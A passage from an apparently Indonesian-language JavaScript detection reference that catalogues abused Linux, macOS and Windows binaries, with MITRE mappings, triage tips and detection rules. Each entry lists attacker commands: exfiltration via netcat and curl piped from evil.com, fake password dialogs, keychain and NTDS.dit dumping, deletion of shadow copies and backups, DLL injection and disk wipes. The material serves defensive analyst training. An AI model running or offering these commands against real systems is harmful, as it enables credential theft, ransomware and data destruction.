      desc:"Disk wipe untuk destruction/anti-forensics, direct disk access untuk bypass filesystem security.",
      cmds:[
        {c:"dd if=/dev/zero of=/dev/sda bs=4096", n:"wipe seluruh disk — data destruction, anti-forensics. IRREVERSIBLE."},
        {c:"dd if=/dev/urandom of=/dev/sda bs=4096", n:"wipe dengan random data — lebih thorough dari zero wipe"},
        {c:"dd if=/dev/sda | gzip | nc 10.10.10.10 4444", n:"disk image exfil via netcat — kirim raw disk image ke attacker (forensic bypass via raw access)"},
        {c:"dd if=/dev/sda of=/tmp/disk.img bs=512 count=2048", n:"copy MBR + first 1MB — bisa extract partition table / boot sector"},
      ]
    },
    legit:"Disk management, forensics. Context critical.",
    tips:["Cek if= + of=","if=/dev/zero + of=/dev/sda = DISK WIPE","Cek parent process","Cek user context"],
    detect:"Alert dd targeting disk devices.",
    ref:["https://attack.mitre.org/techniques/T1485/"] },

  { n:"chmod", c:"system", os:"linux", p:"/usr/bin/chmod",
    d:"Change file permissions", r:"LOW",
    m:["T1222.002"], mn:["Linux File Permissions Modification"], t:["Defense Evasion"],
    tldr:"Sangat common, hampir tidak pernah suspicious sendiri. Cuma worth noted kalau +x ke file baru di /tmp atau /dev/shm — itu bagian dari download-chmod-exec dropper chain. SUID bit ke /bin/bash (chmod 4755) itu privesc.",
    abuse:"chmod +x downloaded payloads.",
    red:{
      desc:"Make downloaded payload executable — hampir selalu muncul setelah download step di kill chain.",
      cmds:[
        {c:"chmod +x /tmp/beacon && /tmp/beacon", n:"make executable + langsung run — step standar post-download di Linux"},
        {c:"chmod +x /dev/shm/.update && /dev/shm/.update", n:"/dev/shm = RAM disk — fileless-ish execution"},
        {c:"chmod 4755 /bin/bash", n:"set SUID bit di bash — privesc: non-root bisa jalankan bash -p sebagai root"},
        {c:"chmod 777 /etc/passwd", n:"open permissions file sensitif — precursor ke privilege escalation"},
      ]
    },
    legit:"Common admin.",
    tips:["Cek target file — new download?","Cek +x suspicious files","Cek 777","Cek parent"],
    detect:"Monitor chmod +x di /tmp, /dev/shm.",
    ref:["https://attack.mitre.org/techniques/T1222.002/"] },

  { n:"iptables", c:"system", os:"linux", p:"/usr/sbin/iptables",
    d:"Linux firewall management", r:"MEDIUM",
    m:["T1562.004"], mn:["Disable or Modify Firewall"], t:["Defense Evasion"],
    tldr:"Firewall management — usage-nya bisa legitimate, yang perlu di-monitor adalah apa yang diubah. -F (flush) semua rules = disable firewall, add allow rules untuk unusual port = buka jalan C2. Monitor perubahan, bukan sekadar execution-nya.",
    abuse:"Disable firewall, allow C2 traffic.",
    red:{
      desc:"Disable atau modify firewall untuk allow C2 traffic, port forwarding untuk pivot.",
      cmds:[
        {c:"iptables -F && iptables -X && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT", n:"flush semua rules + set default ACCEPT — disable firewall sepenuhnya"},
        {c:"iptables -A INPUT -p tcp --dport 4444 -j ACCEPT", n:"buka port 4444 untuk reverse shell listener"},
        {c:"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080", n:"redirect port 80 ke 8080 — port pivot / traffic redirection"},
        {c:"iptables -A OUTPUT -d 10.10.10.10 -j ACCEPT && iptables -A OUTPUT -j DROP", n:"allowlist only C2 IP — block semua outbound kecuali ke attacker"},
      ]
    },
    legit:"Network admin. Cek what changed.",
    tips:["Cek rules — flush? Allow?","Cek port forward added","Cek user context","Cek disable protections"],
    detect:"Monitor iptables mods. Alert flush/allow all.",
    ref:["https://attack.mitre.org/techniques/T1562.004/"] },

  // ┌──────────────────────────────────────────────┐
  // │                macOS                          │
  // └──────────────────────────────────────────────┘
  { n:"osascript", c:"lolbin", os:"macos", p:"/usr/bin/osascript",
    d:"Execute AppleScript/JXA", r:"HIGH",
    m:["T1059.002"], mn:["AppleScript"], t:["Execution"],
    tldr:"AppleScript macOS — attack paling common: fake password dialog untuk credential phishing. -e flag dengan \"display dialog\" + \"hidden answer\" = social engineering creds. Juga bisa dipakai untuk exec shell commands dengan privileges tambahan.",
    abuse:"Arbitrary AppleScript/JXA. Keylogging, screenshot, credential phishing.",
    red:{
      desc:"Credential phishing via fake dialogs, exec shell commands, screenshot, keylogging.",
      cmds:[
        {c:"osascript -e 'set p to text returned of (display dialog \"Your session has expired. Please re-enter your password:\" default answer \"\" with hidden answer)'", n:"fake password dialog — credential phishing, hasil masuk ke variable p"},
        {c:"osascript -e 'do shell script \"curl http://evil.com/mac.sh | bash\"'", n:"exec shell command via AppleScript — dapat bypass beberapa app-level restrictions"},
        {c:"osascript -e 'do shell script \"launchctl load /tmp/com.evil.plist\" with administrator privileges'", n:"prompt admin password untuk load persistence plist — social engineering privesc"},
        {c:"osascript -e 'tell application \"System Events\" to keystroke (do shell script \"cat ~/.ssh/id_rsa\")'", n:"exfil SSH key via AppleScript keystrokes — bypass clipboard monitoring"},
      ]
    },
    legit:"Automation scripts. Cek content.",
    tips:["Cek script content — phishing dialog?","Cek -e (inline script)","Cek parent","Cek network","Cek fake password prompts"],
    detect:"Monitor osascript. Alert -e suspicious content.",
    ref:["https://attack.mitre.org/techniques/T1059/002/"] },

  { n:"security", c:"system", os:"macos", p:"/usr/bin/security",
    d:"macOS Keychain management", r:"HIGH",
    m:["T1555.001"], mn:["Keychain"], t:["Credential Access"],
    tldr:"macOS keychain CLI — dump-keychain atau find-*-password = credential harvest. Modern macOS minta user consent untuk dump, tapi attacker bisa chain dengan social engineering osascript untuk bypass. Cek apa yang di-query.",
    abuse:"Dump keychain credentials.",
    red:{
      desc:"Dump macOS Keychain — stored passwords, certificates, private keys.",
      cmds:[
        {c:"security dump-keychain -d login.keychain-db", n:"dump login keychain — semua stored passwords (butuh user consent popup di modern macOS)"},
        {c:"security find-generic-password -s \"iCloud\" -a username@icloud.com -g 2>&1 | grep password", n:"extract specific password dari keychain — service + account name harus diketahui"},
        {c:"security find-internet-password -s \"github.com\" -g 2>&1 | grep password", n:"extract internet password — browser/git credentials tersimpan di keychain"},
        {c:"security list-keychains && security dump-keychain", n:"list semua keychains + dump — comprehensive credential harvest"},
      ]
    },
    legit:"Keychain management. Dump = investigate.",
    tips:["Cek dump-keychain, find-generic-password","Cek -d flag (dump)","Cek parent","Cek output redirect"],
    detect:"Alert security dump-keychain / find-*-password.",
    ref:["https://attack.mitre.org/techniques/T1555/001/"] },

  { n:"launchctl", c:"system", os:"macos", p:"/bin/launchctl",
    d:"macOS service management", r:"HIGH",
    m:["T1543.001","T1053.004"], mn:["Launch Agent","Launchd"], t:["Persistence","Execution"],
    tldr:"macOS service loader — load dari ~/Library/LaunchAgents = user-level persistence (gak butuh root), /Library/LaunchDaemons = system-level (butuh root). New plist dari unexpected location = investigate plist content dan ProgramArguments-nya.",
    abuse:"Launch Agents/Daemons persistence. macOS services equivalent.",
    red:{
      desc:"Persistence via Launch Agent/Daemon — exec saat logon (agent) atau boot (daemon).",
      cmds:[
        {c:"launchctl load ~/Library/LaunchAgents/com.apple.update.plist", n:"load Launch Agent user-level — persist saat user logon, tidak butuh root"},
        {c:"launchctl load /Library/LaunchDaemons/com.evil.daemon.plist", n:"load Launch Daemon system-level — persist saat boot, butuh root"},
        {c:"launchctl submit -l evil -p /tmp/backdoor.sh -o /tmp/out.log -e /tmp/err.log", n:"submit job langsung tanpa plist file — lebih stealth"},
        {c:"plutil -p ~/Library/LaunchAgents/com.apple.update.plist", n:"baca plist untuk verify isi — cek ProgramArguments"},
      ]
    },
    legit:"System/app management. New agents = investigate.",
    tips:["Cek load/submit commands","Cek plist content+location","Cek ~/Library/LaunchAgents/ (user)","Cek /Library/LaunchDaemons/ (system)","Cek ProgramArguments plist"],
    detect:"Monitor launchctl load. Alert new agents/daemons.",
    ref:["https://attack.mitre.org/techniques/T1543/001/"] },

  // ┌──────────────────────────────────────────────┐
  // │        WINDOWS — RANSOMWARE CHAIN             │
  // └──────────────────────────────────────────────┘
  { n:"vssadmin.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\vssadmin.exe",
    d:"Volume Shadow Copy admin", r:"CRITICAL",
    m:["T1490"], mn:["Inhibit System Recovery"], t:["Impact"],
    tldr:"Satu command — satu tiket ransomware. 'vssadmin delete shadows /all /quiet' adalah signature move hampir SEMUA ransomware buat matiin recovery point. Kalau ini muncul di alert, kemungkinan besar lo udah di tengah-tengah ransomware execution atau attacker lagi prepare impact stage.",
    chain:{ stage:"Impact", flows:["ransomware payload → vssadmin.exe /delete → bcdedit.exe /disable → encrypt files","wmic.exe → vssadmin.exe → wbadmin.exe → lateral move"] },
    abuse:"Delete shadow copies untuk cegah recovery. Ransomware step 1.",
    red:{
      desc:"Hapus semua VSS snapshots — korban tidak bisa restore file, recovery jadi mustahil tanpa backup eksternal.",
      cmds:[
        {c:"vssadmin delete shadows /all /quiet", n:"hapus SEMUA shadow copies tanpa konfirmasi — ransomware signature command"},
        {c:"vssadmin delete shadows /for=C: /quiet", n:"hapus shadow copies spesifik drive C"},
        {c:"vssadmin list shadows", n:"recon — cek apakah ada shadow copies sebelum dihapus"},
        {c:"wmic shadowcopy delete", n:"alternatif command via wmic — sama efeknya"},
      ]
    },
    legit:"Manage VSS snapshots, storage admin.",
    tips:["Cek cmdline — delete shadows /all?","Cek parent process — siapa yang spawn?","Cek timing — bersamaan dengan mass file rename/modify?","Cek apakah ada wevtutil.exe + bcdedit.exe berurutan","Korelasi dengan EDR ransomware alerts","Immediate response: isolate host, preserve memory","Cek apakah backup solutions accessible"],
    detect:"Alert vssadmin + delete + shadows. CRITICAL severity. Sigma: win_susp_vssadmin.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Vssadmin/","https://attack.mitre.org/techniques/T1490/"] },

  { n:"bcdedit.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\bcdedit.exe",
    d:"Boot Configuration Data editor", r:"CRITICAL",
    m:["T1490","T1542.003"], mn:["Inhibit System Recovery","Bootkit"], t:["Impact","Defense Evasion"],
    tldr:"Edit boot config — bisa disable Windows Recovery Mode dan safeboot. Ransomware sering pasangkan ini sama vssadmin buat pastiin korban gak bisa boot ke recovery environment. Kalau muncul bcdedit /set recoveryenabled No, itu ransomware playbook 101.",
    chain:{ stage:"Impact", flows:["vssadmin.exe delete → bcdedit.exe /recoveryenabled No → wbadmin.exe delete → ransomware encrypt"] },
    abuse:"Disable Windows Recovery, disable safe mode, break boot to prevent recovery.",
    red:{
      desc:"Disable recovery mechanisms — ransomware preparation, persistence via bootkit, prevent forensic analysis.",
      cmds:[
        {c:"bcdedit /set {default} recoveryenabled No", n:"disable Windows Recovery Environment — korban gak bisa boot ke WinRE"},
        {c:"bcdedit /set {default} bootstatuspolicy ignoreallfailures", n:"ignore boot failures — prevent auto-recovery trigger"},
        {c:"bcdedit /deletevalue {default} safeboot", n:"hapus safeboot option — prevent boot ke safe mode"},
        {c:"bcdedit /set {bootmgr} displaybootmenu no", n:"sembunyikan boot menu — attacker bisa hide bootkit"},
      ]
    },
    legit:"Dual-boot setup, debug boot config.",
    tips:["Cek recoveryenabled No command","Cek parent process","Cek timing — post vssadmin delete?","Cek siapa user yang exec (admin?)","Korelasi EDR alerts ransomware-related","Cek bootstatuspolicy modification"],
    detect:"Alert bcdedit + recoveryenabled/safeboot modification. Sigma: win_susp_bcdedit.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Bcdedit/","https://attack.mitre.org/techniques/T1490/"] },

  { n:"wevtutil.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\wevtutil.exe",
    d:"Windows Event Log utility", r:"HIGH",
    m:["T1070.001"], mn:["Indicator Removal: Clear Windows Event Logs"], t:["Defense Evasion"],
    tldr:"Event log manager — fungsi legit-nya manage/query logs, tapi 'cl' (clear-log) command dipakai attacker buat hapus jejak. Kalau Security, System, atau Application log di-clear tiba-tiba, ini big red flag cover tracks. Timeline forensic lo bisa bolong gede.",
    chain:{ stage:"Defense Evasion", flows:["post-exploitation → wevtutil.exe cl Security → wevtutil.exe cl System → wevtutil.exe cl Application"] },
    abuse:"Clear Windows event logs — hapus forensic evidence, cover tracks post-exploitation.",
    red:{
      desc:"Log clearing post-compromise untuk hilangkan forensic trail.",
      cmds:[
        {c:"wevtutil cl Security", n:"clear Security event log — hapus logon events, privilege use, audit trail"},
        {c:"wevtutil cl System", n:"clear System log — hapus service start/stop, error events"},
        {c:"wevtutil cl Application", n:"clear Application log"},
        {c:"for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\"", n:"clear ALL event logs sekaligus — complete log wipe"},
        {c:"wevtutil qe Security /count:10 /format:text", n:"query + read Security logs — recon pre-wipe"},
      ]
    },
    legit:"Log management, query events, export logs.",
    tips:["Cek cl/clear-log command","Cek log channel yang di-clear","Cek parent process","Cek timing — post compromise? After lateral movement?","Cek apakah log forwarding (SIEM) masih intact sebelum wipe","Cek apakah ada gap di log timeline","SIEM-based detection lebih reliable (logs forward sebelum dihapus)"],
    detect:"Alert wevtutil + cl/clear-log. SIEM retention tetap preserve logs. Sigma: win_susp_wevtutil_clear.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Wevtutil/","https://attack.mitre.org/techniques/T1070/001/"] },

  { n:"wbadmin.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\wbadmin.exe",
    d:"Windows Backup admin", r:"CRITICAL",
    m:["T1490"], mn:["Inhibit System Recovery"], t:["Impact"],
    tldr:"Windows Backup manager — kalau attacker delete backup catalog, recovery dari Windows Backup jadi impossible. Paket combo ransomware: vssadmin delete + bcdedit disable + wbadmin delete = korban benar-benar terkunci tanpa jalan pulang.",
    chain:{ stage:"Impact", flows:["vssadmin.exe delete → bcdedit.exe disable → wbadmin.exe delete catalog → ransomware payload encrypt"] },
    abuse:"Delete Windows backup catalog, delete system state backups.",
    red:{
      desc:"Hancurkan semua recovery mechanism sebelum ransomware encrypt.",
      cmds:[
        {c:"wbadmin delete catalog -quiet", n:"hapus Windows Backup catalog — Windows Backup tidak bisa digunakan untuk recovery"},
        {c:"wbadmin delete systemstatebackup -deleteOldest", n:"hapus system state backup terlama"},
        {c:"wbadmin delete systemstatebackup -version:VERSION", n:"hapus specific backup version"},
        {c:"wbadmin get versions", n:"recon — list available backup versions sebelum dihapus"},
      ]
    },
    legit:"Windows Backup management, disaster recovery.",
    tips:["Cek delete catalog / delete systemstatebackup","Cek -quiet flag","Cek parent","Cek timing dalam ransomware kill chain","Cek apakah backup masih available","Immediate: isolate + check off-site backups"],
    detect:"Alert wbadmin delete catalog. Part of ransomware kill chain detection.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/","https://attack.mitre.org/techniques/T1490/"] },

  // ┌──────────────────────────────────────────────┐
  // │        WINDOWS — AD / DOMAIN ATTACK           │
  // └──────────────────────────────────────────────┘
  { n:"ntdsutil.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\ntdsutil.exe",
    d:"Active Directory database utility", r:"CRITICAL",
    m:["T1003.003"], mn:["OS Credential Dumping: NTDS"], t:["Credential Access"],
    tldr:"Tool khusus AD admin buat manage NTDS.dit — database hati-hatinya Active Directory yang isinya SEMUA hash password domain. Kalau ntdsutil muncul di non-DC atau dipakai untuk 'activate instance ntds' + 'create full', itu credential dump operation. Game over kalau gak dicegah.",
    chain:{ stage:"Credential Access", flows:["domain admin compromise → ntdsutil.exe NTDS dump → mimikatz ntds parse → pass-the-hash → full domain"] },
    abuse:"Dump NTDS.dit (all domain password hashes). Domain-wide credential harvest.",
    red:{
      desc:"NTDS.dit dump — extract semua hash dari Active Directory database.",
      cmds:[
        {c:"ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\\dump\" q q", n:"IFM dump NTDS.dit + SYSTEM hive ke folder — offline crack semua domain hashes"},
        {c:"ntdsutil \"activate instance ntds\" \"files\" \"integrity\" q q", n:"check NTDS integrity — recon before dump"},
        {c:"ntdsutil snapshot \"activate instance ntds\" \"create\" q q", n:"buat snapshot NTDS untuk VSS-based dump"},
      ]
    },
    legit:"AD Database management, authoritative restore, only on Domain Controllers.",
    tips:["Cek apakah run di DC atau workstation","Cek ifm/create full command","Cek output path file dump","Cek parent process","Cek siapa user (Domain Admin?)","Cek lateral movement ke DC sebelumnya","Cek akses ke output folder dari remote host","Korelasi dengan mimikatz / secretsdump alerts"],
    detect:"Alert ntdsutil di non-DC. Alert ntdsutil + ifm/create full. Sigma: win_susp_ntdsutil.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Ntdsutil/","https://attack.mitre.org/techniques/T1003/003/"] },

  { n:"diskshadow.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\diskshadow.exe",
    d:"Volume Shadow Copy scriptable interface", r:"HIGH",
    m:["T1003.003","T1218"], mn:["OS Credential Dumping: NTDS","Signed Binary Proxy Execution"], t:["Credential Access","Defense Evasion"],
    tldr:"Diskshadow bisa buat shadow copy lalu expose NTDS.dit sebagai drive baru — bypass exclusive lock yang biasanya cegah direct copy. Plus bisa exec commands via script file, jadi double threat. Versi 'elegant' ntdsutil dump yang lebih susah di-detect.",
    abuse:"VSS-based NTDS.dit dump, script execution via .dsh files.",
    red:{
      desc:"Dump NTDS.dit via shadow copy exposure, bypass file lock restriction.",
      cmds:[
        {c:"diskshadow.exe /s C:\\Temp\\shadow.dsh", n:"exec diskshadow script file — shadow.dsh berisi commands create + expose shadow"},
        {c:"set context persistent nowriters\nadd volume c: alias shadow1\ncreate\nexpose %shadow1% z:", n:"isi .dsh file: buat shadow copy C: dan expose sebagai Z:"},
        {c:"copy z:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit", n:"setelah expose, copy NTDS.dit dari shadow (bypass lock)"},
        {c:"reg save HKLM\\SYSTEM C:\\Temp\\system.hiv", n:"dump SYSTEM hive untuk decrypt ntds.dit hashes"},
      ]
    },
    legit:"VSS scripting, backup automation.",
    tips:["Cek /s flag (script execution)","Cek .dsh file content","Cek expose + drive letter assignment","Cek copy dari shadow drive ke temp","Cek parent","Korelasi dengan NTDS.dit access"],
    detect:"Alert diskshadow /s. Monitor NTDS.dit access via shadow path. Sigma: win_susp_diskshadow.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/","https://attack.mitre.org/techniques/T1003/003/"] },

  { n:"dsquery.exe", c:"system", os:"win", p:"C:\\Windows\\System32\\dsquery.exe",
    d:"Active Directory query tool", r:"MEDIUM",
    m:["T1018","T1087.002"], mn:["Remote System Discovery","Account Discovery: Domain Account"], t:["Discovery"],
    tldr:"Built-in AD query tool — legitimate untuk admin, tapi attacker sering pakai ini untuk recon domain users, groups, dan computers. Kalau exec oleh user biasa atau di non-admin host, curigai AD enumeration. Output-nya bisa jadi step pertama sebelum targeted lateral movement.",
    abuse:"Domain user/group/computer enumeration. AD recon pre-lateral movement.",
    red:{
      desc:"AD recon — map semua user, admin, computer, dan trust relationships.",
      cmds:[
        {c:"dsquery user -limit 0", n:"list semua domain users tanpa limit"},
        {c:"dsquery group -name \"Domain Admins\" | dsget group -members -expand", n:"list semua member Domain Admins + nested groups"},
        {c:"dsquery computer -limit 0", n:"list semua domain computers — target list untuk lateral movement"},
        {c:"dsquery user -inactive 4", n:"find user tidak aktif 4 minggu — target untuk takeover (less monitored)"},
        {c:"dsquery * -filter \"(adminCount=1)\" -limit 0", n:"find semua privileged accounts (adminCount=1)"},
      ]
    },
    legit:"AD administration, user management.",
    tips:["Cek siapa yang exec (user biasa atau admin?)","Cek -limit 0 flag (bulk query)","Cek target queries (Domain Admins? adminCount?)","Cek parent process","Korelasi dengan suspicious logon sebelumnya"],
    detect:"Alert dsquery di non-admin context. Alert dsquery + Domain Admins query.",
    ref:["https://attack.mitre.org/techniques/T1087/002/"] },

  // ┌──────────────────────────────────────────────┐
  // │        WINDOWS — MORE LOLBINS                 │
  // └──────────────────────────────────────────────┘
  { n:"regasm.exe", c:"lolbin", os:"win", p:"C:\\Windows\\Microsoft.NET\\Framework\\v*/regasm.exe",
    d:".NET Assembly Registration Utility", r:"HIGH",
    m:["T1218.009"], mn:["Signed Binary Proxy Execution: Regsvcs/Regasm"], t:["Defense Evasion","Execution"],
    tldr:"Signed Microsoft .NET binary yang bisa exec code dari DLL yang lo provide via COM registration — bypass AppLocker dan application whitelisting karena ini trusted binary. Kalau muncul regasm.exe sama DLL dari path aneh (Temp, AppData), itu red flag.",
    abuse:"Execute arbitrary .NET DLL code via COM registration bypass. AppLocker bypass.",
    red:{
      desc:"Proxy exec .NET payload via trusted signed binary, bypass application whitelisting.",
      cmds:[
        {c:"regasm.exe /U malicious.dll", n:"unregister DLL tapi tetap exec RegisterClass/UnRegisterClass methods — bypass AV"},
        {c:"regasm.exe malicious.dll", n:"register DLL — exec code saat registration via [ComRegisterFunction]"},
        {c:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U C:\\Temp\\payload.dll", n:"full path 64-bit exec via regasm"},
      ]
    },
    legit:"Register .NET assemblies as COM components.",
    tips:["Cek DLL path — Temp, AppData, Public?","Cek /U flag","Cek parent process","Cek DLL hash di VirusTotal","Cek apakah DLL adalah .NET assembly"],
    detect:"Alert regasm.exe + DLL dari user-writable path. Sigma: win_susp_regasm.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Regasm/","https://attack.mitre.org/techniques/T1218/009/"] },

  { n:"regsvcs.exe", c:"lolbin", os:"win", p:"C:\\Windows\\Microsoft.NET\\Framework\\v*/regsvcs.exe",
    d:".NET Component Services Registrar", r:"HIGH",
    m:["T1218.009"], mn:["Signed Binary Proxy Execution: Regsvcs/Regasm"], t:["Defense Evasion","Execution"],
    tldr:"Kakak dari regasm.exe — sama-sama bisa jadi proxy buat exec .NET DLL payload via trusted signed binary. Bedanya regsvcs register COM+ application. Pattern deteksi hampir sama: DLL dari path aneh + regsvcs = investigate.",
    abuse:"Execute arbitrary .NET DLL via COM+ registration. AppLocker bypass.",
    red:{
      desc:"Proxy exec .NET payload, bypass application whitelisting.",
      cmds:[
        {c:"regsvcs.exe malicious.dll", n:"register DLL sebagai COM+ component — exec code [ComRegisterFunction]"},
        {c:"regsvcs.exe /U malicious.dll", n:"unregister — tetap exec [ComUnregisterFunction] method"},
        {c:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe C:\\Temp\\payload.dll", n:"full path 64-bit execution"},
      ]
    },
    legit:"Register .NET COM+ application components.",
    tips:["Cek DLL path suspicious?","Cek parent process","Cek DLL hash","Cek COM+ application yang dibuat"],
    detect:"Alert regsvcs.exe + user-writable DLL path.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/","https://attack.mitre.org/techniques/T1218/009/"] },

  { n:"odbcconf.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\odbcconf.exe",
    d:"ODBC Configuration tool", r:"HIGH",
    m:["T1218.008"], mn:["Signed Binary Proxy Execution: Odbcconf"], t:["Defense Evasion","Execution"],
    tldr:"Tool buat configure database drivers tapi bisa dipakai exec DLL via REGSVR action. Jarang banget dipakai legitimate di endpoint biasa — kalau muncul di alert, cek cmdline-nya detail, terutama REGSVR atau /a flag.",
    abuse:"Execute DLL via REGSVR action. AppLocker bypass via signed binary.",
    red:{
      desc:"Proxy exec arbitrary DLL via REGSVR action — bypass application whitelisting.",
      cmds:[
        {c:"odbcconf.exe /a {REGSVR malicious.dll}", n:"exec DllRegisterServer dari DLL — arbitrary code execution"},
        {c:"odbcconf.exe -f C:\\Temp\\config.rsp", n:"load response file yang berisi REGSVR commands — masking payload"},
        {c:"odbcconf.exe /s /a {REGSVR C:\\Temp\\payload.dll}", n:"/s = silent, minimize user interaction"},
      ]
    },
    legit:"ODBC driver configuration.",
    tips:["Cek REGSVR action","Cek DLL path","Cek -f response file path dan isinya","Sangat jarang legitimate di workstation"],
    detect:"Alert odbcconf + REGSVR. Sigma: win_susp_odbcconf.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/","https://attack.mitre.org/techniques/T1218/008/"] },

  { n:"mavinject.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\mavinject.exe",
    d:"Microsoft Application Virtualization Injector", r:"CRITICAL",
    m:["T1055.001"], mn:["Process Injection: Dynamic-link Library Injection"], t:["Defense Evasion","Privilege Escalation"],
    tldr:"Signed Windows binary yang fungsinya MEMANG inject DLL ke process lain — ini basically gratis DLL injector courtesy of Microsoft. Attacker pakai ini inject shellcode/DLL ke trusted process (svchost, explorer) buat evade detection. Hampir zero legitimate use case di endpoint biasa.",
    abuse:"DLL injection into arbitrary process via signed Windows binary.",
    red:{
      desc:"Inject malicious DLL ke legitimate process — code berjalan dalam konteks trusted process.",
      cmds:[
        {c:"mavinject.exe 1234 /INJECTRUNNING C:\\Temp\\evil.dll", n:"inject DLL ke PID 1234 — code exec dalam konteks proses target"},
        {c:"mavinject.exe <PID_svchost> /INJECTRUNNING C:\\Temp\\beacon.dll", n:"inject ke svchost — C2 beacon berjalan dalam svchost context"},
        {c:"mavinject.exe <PID_explorer> /INJECTRUNNING C:\\Users\\Public\\payload.dll", n:"inject ke explorer.exe — evade process-based AV"},
      ]
    },
    legit:"App-V virtualization, extremely rare outside App-V environments.",
    tips:["Cek target PID — ke proses apa inject?","Cek DLL path","Cek parent process","Hampir selalu suspicious di non-App-V environment","Cek apakah DLL target di user-writable path"],
    detect:"Alert mavinject.exe + /INJECTRUNNING. High severity. Sigma: win_susp_mavinject.yml",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Mavinject/","https://attack.mitre.org/techniques/T1055/001/"] },

  { n:"hh.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\hh.exe",
    d:"Microsoft HTML Help executable", r:"MEDIUM",
    m:["T1218"], mn:["Signed Binary Proxy Execution"], t:["Defense Evasion","Execution"],
    tldr:"HTML Help viewer — bisa open .chm files yang isinya bisa embedded scripts (VBScript/JScript). Attacker drop .chm file via phishing, victim double-click, hh.exe exec scripts di dalamnya. Sama kayak mshta tapi lewat help files. Jarang dipakai di enterprise modern.",
    abuse:"Execute embedded scripts in .chm files. Phishing via malicious help files.",
    red:{
      desc:"Script execution via malicious CHM file — bypass AV yang hanya scan .exe.",
      cmds:[
        {c:"hh.exe C:\\Users\\Public\\help.chm", n:"open CHM file — jika berisi ActiveX/script, langsung exec"},
        {c:"hh.exe http://evil.com/payload.chm", n:"load CHM dari URL (beberapa versi Windows)"},
        {c:"hh.exe -decompile C:\\Temp\\ C:\\Temp\\evil.chm", n:"decompile CHM untuk inspect/extract isi"},
      ]
    },
    legit:"Open Windows Help files (.chm).",
    tips:["Cek file path .chm — dari mana?","Cek parent process (email client? browser?)","Cek child process — powershell, cmd spawn?","Cek network connections post-open","Cek .chm file untuk embedded scripts"],
    detect:"Alert hh.exe + .chm dari user-writable path. Alert child process spawn.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Hh/","https://attack.mitre.org/techniques/T1218/"] },

  { n:"dnscmd.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\dnscmd.exe",
    d:"DNS Server management utility", r:"HIGH",
    m:["T1543.003","T1574.002"], mn:["Create or Modify System Process","DLL Side-Loading"], t:["Persistence","Defense Evasion"],
    tldr:"DNS server admin tool yang punya firak mematikan: bisa tambah DLL plugin ke DNS server via /config /serverlevelplugindll. DLL itu di-load oleh dns.exe (SYSTEM level) dan bisa exec arbitrary code. Plus bisa jadi persistence — DLL di-load setiap DNS service start.",
    abuse:"Load malicious DLL into DNS server (SYSTEM-level code exec). DNS server persistence.",
    red:{
      desc:"Inject DLL plugin ke DNS service — exec SYSTEM-level code, persist via service restart.",
      cmds:[
        {c:"dnscmd /config /serverlevelplugindll C:\\Temp\\evil.dll", n:"load DLL sebagai DNS plugin — exec sebagai SYSTEM saat DNS service running"},
        {c:"sc stop dns && sc start dns", n:"restart DNS service untuk trigger DLL load"},
        {c:"dnscmd /enumrecords . /type A", n:"enum DNS records — recon AD environment"},
        {c:"dnscmd /recordadd evil.local A 10.10.10.10", n:"tambah fake DNS record — DNS poisoning / redirect"},
      ]
    },
    legit:"DNS server administration on Windows DNS servers.",
    tips:["Cek /config /serverlevelplugindll","Cek DLL path","Cek apakah DNS service restart setelahnya","Cek di server apa dijalankan (DNS server?)","Monitor dns.exe loading non-standard DLL"],
    detect:"Alert dnscmd + serverlevelplugindll. Monitor dll load oleh dns.exe.",
    ref:["https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/","https://attack.mitre.org/techniques/T1543/003/"] },

  { n:"icacls.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\icacls.exe",
    d:"File/folder permission manager", r:"MEDIUM",
    m:["T1222.001"], mn:["File and Directory Permissions Modification"], t:["Defense Evasion"],
    tldr:"Manage ACL (permission) file dan folder — attacker pakai buat grant access ke file yang harusnya restricted, atau lock out defender dari mengakses evidence/tools mereka. Kalau muncul di cmdline context compromised user, cek target path-nya.",
    abuse:"Grant full access ke file restricted, hide tools dari defender, break permission inheritance.",
    red:{
      desc:"Modify permissions untuk akses file restricted atau lindungi malicious tools.",
      cmds:[
        {c:"icacls C:\\Temp\\evil.exe /grant Everyone:F", n:"grant full access ke semua user — ensure payload bisa exec dari mana saja"},
        {c:"icacls C:\\Windows\\System32 /deny Everyone:R", n:"deny read access — sabotage (destructive)"},
        {c:"icacls C:\\Temp\\malware /grant Administrators:F /inheritance:r", n:"set explicit permission + remove inheritance"},
        {c:"icacls C:\\pagefile.sys /grant Administrators:F", n:"gain access ke normally locked system files"},
      ]
    },
    legit:"Permission management, ACL auditing.",
